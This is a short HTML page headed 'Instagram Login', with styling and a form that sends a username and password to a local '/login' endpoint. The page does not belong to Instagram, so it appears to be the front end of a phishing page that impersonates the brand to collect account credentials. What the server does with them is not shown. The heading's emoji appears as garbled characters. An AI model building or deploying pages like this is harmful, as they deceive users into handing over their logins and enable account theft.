<h2>üîê Instagram Login</h2>
<style>
  body {
    background: #102041;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  h2 {
    text-align: center;
    margin-top: 1rem;
    color: #4f46e5;
  }
  form {
    max-width: 400px;
    margin: 2rem auto;
    background: white;
    padding: 2rem;
    border-radius: 10px;
    box-shadow: 0 4px 16px rgba(0,0,0,0.1);
    animation: fadeInUp 0.6s ease-out;
  }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    margin-bottom: 1rem;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 1rem;
  }

  button {
    width: 100%;
    background: #6366f1;
    color: white;
    padding: 10px;
    font-size: 1rem;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.3s;
  }

  button:hover {
    background: #4f46e5;
  }

  @keyframes fadeInUp {
    from { opacity: 0; transform: translateY(20px); }
    to   { opacity: 1; transform: translateY(0); }
  }
</style>

<form method="POST" action="/login">
  <input type="text" name="username" required placeholder="Instagram ID">
  <input type="password" name="password" required placeholder="Password">
  <button type="submit">üîí Login</button>
</form>
